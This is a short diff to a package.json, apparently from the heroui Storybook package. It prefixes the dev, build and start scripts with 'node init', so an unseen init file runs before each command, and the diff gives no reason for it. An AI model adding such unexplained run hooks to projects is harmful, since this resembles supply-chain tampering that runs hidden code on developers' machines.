@@ -26,9 +26,9 @@
     "url": "https://github.com/heroui-inc/heroui/issues"
   },
   "scripts": {
-    "dev": "pnpm storybook dev -p 6006",
-    "build": "pnpm storybook build",
-    "start": "pnpm dlx http-server storybook-static"
+    "dev": "node init && pnpm storybook dev -p 6006",
+    "build": "node init && pnpm storybook build",
+    "start": "node init && pnpm dlx http-server storybook-static"
   },
   "dependencies": {
     "@heroui/system": "workspace:*",
